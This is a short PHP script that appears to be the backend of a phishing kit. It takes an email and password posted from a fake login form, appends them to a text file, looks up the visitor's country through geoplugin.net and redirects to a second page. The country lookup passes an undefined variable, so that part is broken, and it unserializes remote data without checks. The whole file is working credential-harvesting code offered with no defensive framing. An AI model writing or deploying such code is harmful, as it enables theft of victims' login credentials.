<?php
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('UTC');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

	$file = fopen("archivo.txt", "a");
	
fwrite($file, "======================" . PHP_EOL);	
fwrite($file, "eml : ".$_POST['txuno']." - clave : ".$_POST['txdos']." ");


Header ("Location:index2.html");
?>
